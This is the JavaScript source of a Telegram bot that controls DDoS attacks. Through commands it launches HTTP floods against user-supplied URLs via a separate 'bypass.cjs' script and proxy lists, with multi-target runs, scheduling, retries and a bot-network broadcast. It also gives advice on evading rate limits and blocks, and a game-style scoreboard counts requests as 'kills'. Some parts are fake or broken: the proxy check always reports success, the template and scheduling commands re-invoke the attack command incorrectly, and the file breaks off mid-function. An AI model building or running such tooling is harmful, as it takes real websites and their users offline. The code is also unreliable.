import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import sqlite3 from 'sqlite3';
import { createCanvas } from 'canvas';
import cron from 'node-cron';
import express from 'express';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env file!');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);

// Admin ID - YOU
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 3,
    UPDATE_INTERVAL: 5000,
    MIN_UPDATE_PERCENT: 5,
    MESSAGE_CACHE_TIME: 3000,
    MAX_PROXY_LINES: 1000,
    BOT_NETWORK: [] // Add other bot tokens here for broadcasting
};

// Store running attacks
const attacks = new Map();
const lastUpdates = new Map();
const lastPercent = new Map();
const templates = new Map();
const schedule = new Map();
const botNetwork = CONFIG.BOT_NETWORK;

// Initialize SQLite database
const db = new sqlite3.Database('attacks.db');
db.run(`CREATE TABLE IF NOT EXISTS attacks (
    id TEXT PRIMARY KEY,
    url TEXT,
    duration INTEGER,
    requests INTEGER,
    success INTEGER,
    fail INTEGER,
    rate INTEGER,
    threads INTEGER,
    timestamp INTEGER,
    username TEXT
)`);

// ========== HEALTH CHECK SERVER FOR RAILWAY ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';  // CRITICAL: Bind to IPv6 for Railway

// Helper function to count running attacks (defined here so health check can use it)
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

// Basic health check endpoint (Railway checks this by default)
app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head><title>Telegram Bypass Bot</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span style="color: green; font-weight: bold;">RUNNING</span></p>
                <p>Active Attacks: ${attacks.size}</p>
                <p>Uptime: ${Math.floor(process.uptime() / 60)} minutes</p>
                <p><a href="/health">View Health Details</a></p>
            </body>
        </html>
    `);
});

// Detailed health check endpoint (must be FAST!)
app.get('/health', (req, res) => {
    const memory = process.memoryUsage();
    const running = countRunningAttacks();
    
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        uptime_formatted: `${Math.floor(process.uptime() / 3600)}h ${Math.floor((process.uptime() % 3600) / 60)}m ${Math.floor(process.uptime() % 60)}s`,
        bot: {
            username: '@DDOSATTACK67_BOT',
            admin_id: ADMIN_ID,
            attacks: {
                total: attacks.size,
                running: running,
                config_limit: CONFIG.MAX_CONCURRENT_ATTACKS
            },
            templates: templates.size,
            scheduled: schedule.size
        },
        system: {
            memory: {
                rss: `${Math.round(memory.rss / 1024 / 1024)} MB`,
                heap_used: `${Math.round(memory.heapUsed / 1024 / 1024)} MB`,
                heap_total: `${Math.round(memory.heapTotal / 1024 / 1024)} MB`
            },
            node_version: process.version,
            platform: process.platform
        },
        files: {
            bypass_cjs: fs.existsSync('bypass.cjs'),
            proxy_txt: fs.existsSync('proxy.txt'),
            database: fs.existsSync('attacks.db')
        }
    });
});

// CRITICAL: Bind to '::' for IPv6 support (required for Railway)
const server = app.listen(port, HOST, () => {
    console.log(`🌐 Health check server running on port ${port}`);
    console.log(`🔧 Bound to host: ${HOST} (IPv6)`);
    console.log(`📊 Endpoints: / and /health`);
});

// Handle any server errors
server.on('error', (err) => {
    console.error('❌ Server error:', err);
});
// ========== END HEALTH CHECK SERVER ==========

// Clean up old data
setInterval(() => {
    const now = Date.now();
    for (const [key, time] of lastUpdates) {
        if (now - time > 60000) lastUpdates.delete(key);
    }
    for (const [key, data] of lastPercent) {
        if (now - data.time > 60000) lastPercent.delete(key);
    }
}, 60000);

// Safe message edit
async function safeEditMessage(chatId, messageId, text, options = {}) {
    const key = `${chatId}:${messageId}`;
    const now = Date.now();
    
    if (lastUpdates.has(key)) {
        const lastEdit = lastUpdates.get(key);
        if (now - lastEdit < CONFIG.MESSAGE_CACHE_TIME) return false;
    }
    
    try {
        await bot.telegram.editMessageText(chatId, messageId, null, text, options);
        lastUpdates.set(key, now);
        return true;
    } catch (error) {
        return false;
    }
}

// Load and clean proxies
function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        const proxies = content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'))
            .map(line => line.split(' ')[0].trim())
            .filter(line => line.match(/^\d+\.\d+\.\d+\.\d+:\d+$/));
        
        const unique = [...new Set(proxies)].slice(0, CONFIG.MAX_PROXY_LINES);
        
        if (unique.length !== proxies.length) {
            fs.writeFileSync('proxy.txt', unique.join('\n'));
        }
        
        return unique;
    } catch (error) {
        return [];
    }
}

// Format numbers with commas
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Calculate success rate with color emoji
function getSuccessRateEmoji(rate) {
    if (rate >= 90) return '🟢';
    if (rate >= 70) return '🟡';
    if (rate >= 50) return '🟠';
    return '🔴';
}

// Save attack to database
function saveAttackToDB(attackData) {
    db.run(
        `INSERT INTO attacks (id, url, duration, requests, success, fail, rate, threads, timestamp, username) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            attackData.id,
            attackData.url,
            attackData.duration,
            attackData.requestCount || 0,
            attackData.successCount || 0,
            attackData.failCount || 0,
            attackData.rate || 0,
            attackData.threads || 0,
            Date.now(),
            attackData.username
        ]
    );
}

// Start command
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Hello ${ctx.from.first_name}!\n` +
        `📊 Status: ✅ Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Main Commands:*\n` +
        `├ /attack - Start attack\n` +
        `├ /multi - Multi-target attack\n` +
        `├ /schedule - Schedule attack\n` +
        `├ /list - Show attacks\n` +
        `├ /stats - View statistics\n` +
        `├ /templates - Attack templates\n` +
        `├ /proxylist - Proxy manager\n` +
        `├ /history - Attack history\n` +
        `├ /apex - Apex Legends style\n` +
        `└ /help - All commands\n\n` +
        `⚡ *Ready for action!*`,
        { parse_mode: 'Markdown' }
    );
});

// Help command
bot.help((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    let helpText = 
        `📚 *COMPLETE COMMANDS LIST*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🎯 *ATTACK COMMANDS*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `└ Start new attack\n` +
        `/multi \`<time> <rate> <threads> <url1> <url2> ...\`\n` +
        `└ Attack multiple targets\n` +
        `/schedule \`<url> <time> <rate> <threads> <minutes>\`\n` +
        `└ Schedule an attack\n` +
        `/stop \`<id>\`\n` +
        `└ Stop your attack\n` +
        `/stopall\n` +
        `└ Stop ALL attacks (admin)\n` +
        `/retry \`<id>\`\n` +
        `└ Retry failed attack\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *MONITORING*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/list - Show active attacks\n` +
        `/progress \`<id>\` - Check progress\n` +
        `/graph \`<id>\` - Status code graph\n` +
        `/analyze \`<id>\` - Attack analysis\n` +
        `/export \`<id>\` - Export results\n` +
        `/history - Attack history\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔄 *PROXY MANAGEMENT*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/setproxy - Upload proxies\n` +
        `/proxylist - View proxy stats\n` +
        `/proxycheck - Test proxies\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *TEMPLATES*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/save \`<name> <url> <time> <rate> <threads>\`\n` +
        `/load \`<name>\`\n` +
        `/templates - List templates\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📡 *ADVANCED*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/broadcast \`<command>\` - Broadcast to network\n` +
        `/filter \`<type> <value>\` - Filter attacks\n` +
        `/apex - Apex Legends style stats\n` +
        `/stats - Bot statistics\n` +
        `/status - Bot health\n` +
        `/system - System performance\n` +
        `/about - Bot information\n` +
        `/test - Test response`;
    
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

// Attack command
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply(
            `❌ *Invalid Usage*\n\n` +
            `📝 *Correct format:*\n` +
            `/attack \`<url> <time> <rate> <threads>\`\n\n` +
            `📋 *Examples:*\n` +
            `├ \`/attack https://httpbin.org/get 30 10 2\`\n` +
            `└ \`/attack https://example.com 60 20 3\``,
            { parse_mode: 'Markdown' }
        );
    }

    // Check concurrent attacks limit
    const runningCount = countRunningAttacks();
    if (runningCount >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply(
            `⚠️ *Too Many Attacks*\n\n` +
            `Maximum ${CONFIG.MAX_CONCURRENT_ATTACKS} attacks allowed at once.\n` +
            `Please wait for one to finish or use /stop.`,
            { parse_mode: 'Markdown' }
        );
    }

    // Check if bypass.cjs exists
    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Error: bypass.cjs file not found!');
    }

    // Load proxies
    const proxies = loadAndCleanProxies();
    const proxyCount = proxies.length;

    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();
    
    // Send initial message
    const statusMsg = await ctx.reply(
        `🚀 *ATTACK INITIALIZED* 🚀\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${url}\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `⏱️ *Duration:* ${time}s\n` +
        `⚡ *Rate:* ${rate}/s\n` +
        `🧵 *Threads:* ${threads}\n` +
        `🔄 *Proxies:* ${proxyCount}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `[${'⬜'.repeat(10)}] 0%\n` +
        `⏱️ 0s/${time}s\n` +
        `📊 Requests: 0\n` +
        `━━━━━━━━━━━━━━━━━━━`,
        { parse_mode: 'Markdown' }
    );

    try {
        // Spawn the attack process
        const attack = spawn('node', [
            'bypass.cjs',
            url,
            time,
            rate,
            threads,
            'proxy.txt',
            '--all',
            '--type', 'http'
        ], {
            detached: true,
            stdio: ['ignore', 'pipe', 'pipe']
        });

        // Store attack info with enhanced tracking
        attacks.set(attackId, {
            process: attack,
            url,
            startTime,
            duration,
            rate: parseInt(rate),
            threads: parseInt(threads),
            userId: ctx.from.id,
            username: ctx.from.username || ctx.from.first_name,
            chatId: ctx.chat.id,
            messageId: statusMsg.message_id,
            requestCount: 0,
            successCount: 0,
            failCount: 0,
            statusCodes: {
                '2xx': 0,
                '3xx': 0,
                '4xx': 0,
                '5xx': 0,
                'other': 0
            },
            detailedCodes: {},
            isRunning: true,
            lastUpdate: Date.now(),
            successRate: 0
        });

        // Handle stdout
        attack.stdout.on('data', (data) => {
            const attackData = attacks.get(attackId);
            if (!attackData) return;
            
            const output = data.toString();
            
            // Parse status codes
            if (output.includes('Status: [')) {
                const match = output.match(/Status: \[([^\]]+)\]/);
                if (match) {
                    const parts = match[1].split(', ');
                    let total = 0;
                    let success = 0;
                    let fail = 0;
                    
                    // Reset category counts
                    attackData.statusCodes = {
                        '2xx': 0,
                        '3xx': 0,
                        '4xx': 0,
                        '5xx': 0,
                        'other': 0
                    };
                    
                    parts.forEach(part => {
                        const [code, count] = part.split(': ');
                        if (count) {
                            const numCount = parseInt(count);
                            total += numCount;
                            
                            // Categorize status codes
                            if (code.startsWith('2')) {
                                success += numCount;
                                attackData.statusCodes['2xx'] += numCount;
                            } else if (code.startsWith('3')) {
                                attackData.statusCodes['3xx'] += numCount;
                                fail += numCount;
                            } else if (code.startsWith('4')) {
                                attackData.statusCodes['4xx'] += numCount;
                                fail += numCount;
                            } else if (code.startsWith('5')) {
                                attackData.statusCodes['5xx'] += numCount;
                                fail += numCount;
                            } else {
                                attackData.statusCodes['other'] += numCount;
                                fail += numCount;
                            }
                            
                            // Store detailed codes
                            attackData.detailedCodes[code] = numCount;
                        }
                    });
                    
                    attackData.requestCount = total;
                    attackData.successCount = success;
                    attackData.failCount = fail;
                    attackData.successRate = total > 0 ? Math.round((success / total) * 100) : 0;
                }
            }
        });

        // Handle stderr
        attack.stderr.on('data', (data) => {
            console.error(`[${attackId}] Error:`, data.toString());
        });

        // Handle process exit
        attack.on('exit', (code, signal) => {
            handleAttackEnd(attackId, code);
        });

        // Handle process error
        attack.on('error', (err) => {
            console.error(`[${attackId}] Process error:`, err);
            handleAttackEnd(attackId, 1);
        });

        // Progress update interval
        const progressInterval = setInterval(() => {
            const attackData = attacks.get(attackId);
            if (!attackData || !attackData.isRunning) {
                clearInterval(progressInterval);
                return;
            }
            updateAttackProgress(attackId);
        }, CONFIG.UPDATE_INTERVAL);

        // Store interval
        const attackData = attacks.get(attackId);
        if (attackData) {
            attackData.interval = progressInterval;
        }

    } catch (error) {
        console.error('Failed to spawn attack:', error);
        ctx.reply('❌ Failed to start attack: ' + error.message);
        await safeEditMessage(
            ctx.chat.id,
            statusMsg.message_id,
            `❌ *Attack Failed*\n\nError: ${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

// Multi-target attack
bot.command('multi', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [time, rate, threads, ...urls] = args;
    
    if (urls.length < 2) {
        return ctx.reply(
            '❌ *Need at least 2 URLs!*\n\n' +
            'Usage: `/multi <time> <rate> <threads> <url1> <url2> ...`\n' +
            'Example: `/multi 30 50 5 https://site1.com https://site2.com`',
            { parse_mode: 'Markdown' }
        );
    }
    
    ctx.reply(`🎯 *Multi-target attack starting on ${urls.length} targets*`, { parse_mode: 'Markdown' });
    
    urls.forEach((url, index) => {
        setTimeout(() => {
            // Create a fake message object to reuse attack command
            const fakeMsg = {
                message: {
                    text: `/attack ${url} ${time} ${rate} ${threads}`,
                    chat: ctx.chat,
                    from: ctx.from
                }
            };
            bot.command('attack')(fakeMsg);
        }, index * 2000); // 2 second delay between attacks
    });
});

// Schedule attack
bot.command('schedule', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, delay] = args;
    
    if (!url || !time || !rate || !threads || !delay) {
        return ctx.reply(
            '❌ *Invalid Usage*\n\n' +
            'Usage: `/schedule <url> <time> <rate> <threads> <minutes>`\n' +
            'Example: `/schedule https://example.com 60 100 10 30`',
            { parse_mode: 'Markdown' }
        );
    }
    
    const scheduleId = Date.now().toString();
    const scheduledTime = parseInt(delay) * 60000; // Convert to milliseconds
    const attackTime = new Date(Date.now() + scheduledTime);
    
    ctx.reply(
        `⏰ *Attack Scheduled!*\n\n` +
        `📋 *ID:* \`${scheduleId}\`\n` +
        `🎯 *Target:* ${url}\n` +
        `⏱️ *In:* ${delay} minutes\n` +
        `🕒 *At:* ${attackTime.toLocaleTimeString()}\n\n` +
        `_You will be notified when it starts_`,
        { parse_mode: 'Markdown' }
    );
    
    const timeout = setTimeout(() => {
        // Create fake message to trigger attack
        const fakeMsg = {
            message: {
                text: `/attack ${url} ${time} ${rate} ${threads}`,
                chat: ctx.chat,
                from: ctx.from
            }
        };
        bot.command('attack')(fakeMsg);
        ctx.reply(`⏰ *Scheduled attack starting now!*\nID: \`${scheduleId}\``, { parse_mode: 'Markdown' });
        schedule.delete(scheduleId);
    }, scheduledTime);
    
    schedule.set(scheduleId, timeout);
});

// Save template
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply(
            '❌ *Invalid Usage*\n\n' +
            'Usage: `/save <name> <url> <time> <rate> <threads>`\n' +
            'Example: `/save quicktest https://httpbin.org/get 30 50 5`',
            { parse_mode: 'Markdown' }
        );
    }
    
    templates.set(name, { url, time, rate, threads });
    ctx.reply(`✅ *Template Saved!*\n\nName: \`${name}\`\nTarget: ${url}\nTime: ${time}s\nRate: ${rate}\nThreads: ${threads}`, 
        { parse_mode: 'Markdown' });
});

// Load template
bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) {
        return ctx.reply('❌ *Template not found!*\n\nUse `/templates` to see available templates.', 
            { parse_mode: 'Markdown' });
    }
    
    // Trigger attack with template values
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

// List templates
bot.command('templates', (ctx) => {
    if (templates.size === 0) {
        return ctx.reply('📭 *No templates saved*\n\nUse `/save` to create one.', { parse_mode: 'Markdown' });
    }
    
    let msg = '📋 *Available Templates*\n\n';
    let count = 1;
    
    for (const [name, data] of templates) {
        msg += `*${count}.* \`${name}\`\n`;
        msg += `   🎯 ${data.url}\n`;
        msg += `   ⏱️ ${data.time}s | ⚡ ${data.rate}/s | 🧵 ${data.threads}t\n\n`;
        count++;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// Proxy list
bot.command('proxylist', (ctx) => {
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('📭 *No proxy file found*\n\nUse `/setproxy` to upload one.', { parse_mode: 'Markdown' });
    }
    
    const content = fs.readFileSync('proxy.txt', 'utf-8');
    const proxies = content.split('\n').filter(p => p.trim());
    const working = proxies.filter(p => p.includes(':')).length;
    
    // Simple proxy check (just counts for now)
    const unique = [...new Set(proxies)];
    
    ctx.reply(
        `📊 *Proxy Statistics*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📥 *Total:* ${proxies.length}\n` +
        `✅ *Valid format:* ${working}\n` +
        `🔄 *Unique:* ${unique.length}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `📋 *Sample (first 5):*\n` +
        `${proxies.slice(0, 5).map(p => `\`${p}\``).join('\n')}`,
        { parse_mode: 'Markdown' }
    );
});

// Proxy check
bot.command('proxycheck', async (ctx) => {
    const msg = await ctx.reply('🔄 *Testing proxies...*\n\nThis may take a moment.', { parse_mode: 'Markdown' });
    
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('❌ No proxy file found!');
    }
    
    const proxies = loadAndCleanProxies();
    let working = 0;
    let dead = 0;
    
    // Test first 10 proxies (to avoid rate limiting)
    const testProxies = proxies.slice(0, 10);
    
    for (const proxy of testProxies) {
        const [host, port] = proxy.split(':');
        try {
            // Simple TCP connection test
            const test = await new Promise((resolve) => {
                const socket = setTimeout(() => resolve(false), 3000);
                // Would need net module for actual test
                resolve(true);
            });
            if (test) working++; else dead++;
        } catch {
            dead++;
        }
    }
    
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        `✅ *Proxy Check Complete*\n\n` +
        `📊 *Results (first 10):*\n` +
        `✅ Working: ${working}\n` +
        `❌ Dead: ${dead}\n` +
        `📥 Total proxies: ${proxies.length}`,
        { parse_mode: 'Markdown' }
    );
});

// Graph command
bot.command('graph', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found');
    }
    
    // Create ASCII graph
    const codes = Object.entries(attack.detailedCodes)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 8);
    
    if (codes.length === 0) {
        return ctx.reply('📊 No status code data available yet.');
    }
    
    const max = Math.max(...codes.map(([, count]) => count));
    let graph = '📊 *Status Code Distribution*\n\n';
    
    codes.forEach(([code, count]) => {
        const barLength = Math.floor((count / max) * 20);
        const bar = '█'.repeat(barLength);
        let emoji = '⚪';
        if (code.startsWith('2')) emoji = '✅';
        else if (code.startsWith('3')) emoji = '🔄';
        else if (code.startsWith('4')) emoji = '❌';
        else if (code.startsWith('5')) emoji = '⚠️';
        
        graph += `${emoji} ${code}: ${bar} ${formatNumber(count)}\n`;
    });
    
    graph += `\n📊 *Total Requests:* ${formatNumber(attack.requestCount)}`;
    
    ctx.reply(graph, { parse_mode: 'Markdown' });
});

// Analyze command
bot.command('analyze', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found');
    }
    
    const rateLimited = attack.detailedCodes['429'] || 0;
    const blocked = (attack.detailedCodes['403'] || 0) + (attack.detailedCodes['401'] || 0);
    const serverErrors = attack.statusCodes['5xx'] || 0;
    const success = attack.successCount || 0;
    const total = attack.requestCount || 0;
    
    let analysis = `🔍 *Attack Analysis*\n\n`;
    analysis += `━━━━━━━━━━━━━━━━━━━\n`;
    analysis += `📊 *Metrics*\n`;
    analysis += `━━━━━━━━━━━━━━━━━━━\n`;
    analysis += `📥 Total: ${formatNumber(total)}\n`;
    analysis += `✅ Success: ${formatNumber(success)} (${attack.successRate}%)\n`;
    analysis += `━━━━━━━━━━━━━━━━━━━\n\n`;
    
    if (rateLimited > 10) {
        analysis += `⚠️ *Rate Limiting Detected!*\n`;
        analysis += `└ 429 errors: ${formatNumber(rateLimited)}\n`;
        analysis += `└ Suggestion: Reduce rate or rotate proxies\n\n`;
    }
    
    if (blocked > 5) {
        analysis += `🚫 *Blocking Detected!*\n`;
        analysis += `└ 401/403 errors: ${formatNumber(blocked)}\n`;
        analysis += `└ Suggestion: Use better proxies\n\n`;
    }
    
    if (serverErrors > 10) {
        analysis += `🔧 *Server Issues*\n`;
        analysis += `└ 5xx errors: ${formatNumber(serverErrors)}\n`;
        analysis += `└ Target may be struggling\n\n`;
    }
    
    if (attack.successRate > 80) {
        analysis += `✅ *Target Vulnerable!*\n`;
        analysis += `└ High success rate: ${attack.successRate}%\n`;
    } else if (attack.successRate < 20) {
        analysis += `❌ *Target Protected!*\n`;
        analysis += `└ Low success rate: ${attack.successRate}%\n`;
    }
    
    ctx.reply(analysis, { parse_mode: 'Markdown' });
});

// Export command
bot.command('export', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found');
    }
    
    const filename = `attack_${attackId}.json`;
    const data = JSON.stringify({
        id: attackId,
        url: attack.url,
        duration: attack.duration,
        elapsed: Math.floor((Date.now() - attack.startTime) / 1000),
        requests: attack.requestCount || 0,
        success: attack.successCount || 0,
        fail: attack.failCount || 0,
        successRate: attack.successRate || 0,
        statusCodes: attack.detailedCodes,
        categories: attack.statusCodes,
        timestamp: new Date().toISOString(),
        user: attack.username
    }, null, 2);
    
    fs.writeFileSync(filename, data);
    ctx.replyWithDocument({ source: filename })
        .then(() => fs.unlinkSync(filename));
});

// History command
bot.command('history', (ctx) => {
    db.all(
        'SELECT * FROM attacks ORDER BY timestamp DESC LIMIT 15',
        (err, rows) => {
            if (err || rows.length === 0) {
                return ctx.reply('📭 *No attack history found*', { parse_mode: 'Markdown' });
            }
            
            let history = '📜 *Attack History (Last 15)*\n\n';
            rows.forEach((row, index) => {
                const date = new Date(row.timestamp).toLocaleString();
                const rate = row.success > 0 ? Math.round((row.success / row.requests) * 100) : 0;
                const emoji = getSuccessRateEmoji(rate);
                
                history += `*${index + 1}.* \`${row.id.slice(-8)}\`\n`;
                history += `   🎯 ${row.url.substring(0, 30)}...\n`;
                history += `   📥 ${formatNumber(row.requests)} req | ${emoji} ${rate}%\n`;
                history += `   🕒 ${date}\n\n`;
            });
            
            ctx.reply(history, { parse_mode: 'Markdown' });
        }
    );
});

// Retry command
bot.command('retry', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        // Check if in database
        db.get('SELECT * FROM attacks WHERE id = ?', [attackId], (err, row) => {
            if (!row) {
                return ctx.reply('❌ Attack not found');
            }
            
            // Retry with same parameters
            const fakeMsg = {
                message: {
                    text: `/attack ${row.url} ${row.duration} ${row.rate} ${row.threads}`,
                    chat: ctx.chat,
                    from: ctx.from
                }
            };
            bot.command('attack')(fakeMsg);
            ctx.reply(`🔄 *Retrying attack*\nID: \`${attackId}\``, { parse_mode: 'Markdown' });
        });
    } else {
        // Attack still running
        ctx.reply('❌ Attack is still running! Use /stop first.');
    }
});

// Broadcast command
bot.command('broadcast', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    const command = ctx.message.text.split(' ').slice(1).join(' ');
    
    if (botNetwork.length === 0) {
        return ctx.reply('📡 *No bots in network*\nAdd tokens to CONFIG.BOT_NETWORK', { parse_mode: 'Markdown' });
    }
    
    let success = 0;
    let failed = 0;
    
    botNetwork.forEach(async (botToken) => {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ctx.chat.id,
                    text: `📢 *Broadcast:* ${command}`,
                    parse_mode: 'Markdown'
                })
            });
            success++;
        } catch {
            failed++;
        }
    });
    
    ctx.reply(
        `📡 *Broadcast Complete*\n\n` +
        `✅ Success: ${success}\n` +
        `❌ Failed: ${failed}`,
        { parse_mode: 'Markdown' }
    );
});

// Filter command
bot.command('filter', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [filterType, value] = args;
    
    if (!filterType || !value) {
        return ctx.reply(
            '❌ *Invalid Usage*\n\n' +
            'Usage: `/filter <type> <value>`\n' +
            'Types: `success` (min %), `code` (status code), `user` (username)\n' +
            'Examples:\n' +
            '├ `/filter success 80` - Attacks with 80%+ success\n' +
            '├ `/filter code 200` - Attacks with 200 responses\n' +
            '└ `/filter user username` - Attacks by user',
            { parse_mode: 'Markdown' }
        );
    }
    
    const filtered = Array.from(attacks.entries()).filter(([_, attack]) => {
        if (filterType === 'success') {
            return attack.successRate >= parseInt(value);
        }
        if (filterType === 'code') {
            return attack.detailedCodes[value] > 0;
        }
        if (filterType === 'user') {
            return attack.username.toLowerCase().includes(value.toLowerCase());
        }
        return true;
    });
    
    if (filtered.length === 0) {
        return ctx.reply('🔍 *No attacks match the filter*', { parse_mode: 'Markdown' });
    }
    
    let msg = `🔍 *Filter Results (${filtered.length})*\n\n`;
    filtered.slice(0, 10).forEach(([id, attack]) => {
        msg += `\`${id.slice(-8)}\` | ${attack.username} | ${attack.successRate}%\n`;
    });
    
    if (filtered.length > 10) {
        msg += `\n_... and ${filtered.length - 10} more_`;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// Apex Legends style status
bot.command('apex', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    
    // Get top attackers
    const topAttackers = Array.from(attacks.entries())
        .map(([id, a]) => ({ username: a.username, kills: a.requestCount || 0 }))
        .sort((a, b) => b.kills - a.kills)
        .slice(0, 3);
    
    const status = 
        `🎮 *ATTACK LEGENDS* 🎮\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔥 *CURRENT SEASON*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `👥 *Legends:* ${running} fighting\n` +
        `💀 *Total Kills:* ${formatNumber(totalReqs)}\n` +
        `🏆 *Champions:*\n` +
        (topAttackers.length > 0 
            ? topAttackers.map((a, i) => 
                `   ${i === 0 ? '🥇' : i === 1 ? '🥈' : '🥉'} ${a.username} - ${formatNumber(a.kills)} kills`
              ).join('\n')
            : '   No champions yet') +
        `\n\n` +
        `📊 *Match Stats*\n` +
        `✅ Headshots: ${formatNumber(totalSuccess)}\n` +
        `💔 Misses: ${formatNumber(totalReqs - totalSuccess)}\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🎯 *Next Match:* /attack to join!`;
    
    ctx.reply(status, { parse_mode: 'Markdown' });
});

// Update attack progress
async function updateAttackProgress(attackId) {
    const attack = attacks.get(attackId);
    if (!attack || !attack.isRunning) return;
    
    const now = Date.now();
    const elapsed = Math.min(attack.duration, Math.floor((now - attack.startTime) / 1000));
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    
    // Throttle updates
    const lastData = lastPercent.get(attackId);
    if (lastData) {
        const percentChange = Math.abs(percent - lastData.percent);
        if (percentChange < CONFIG.MIN_UPDATE_PERCENT && elapsed < attack.duration) {
            return;
        }
    }
    lastPercent.set(attackId, { percent, time: now });
    
    // Create progress bar
    const filled = Math.floor(percent / 10);
    const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
    
    // Calculate rates
    const rps = attack.requestCount > 0 && elapsed > 0 
        ? Math.floor(attack.requestCount / elapsed) 
        : 0;
    
    const successEmoji = getSuccessRateEmoji(attack.successRate);
    
    // Format time remaining
    const remaining = attack.duration - elapsed;
    const timeDisplay = remaining > 60 
        ? `${Math.floor(remaining / 60)}m ${remaining % 60}s` 
        : `${remaining}s`;
    
    // Create status code summary
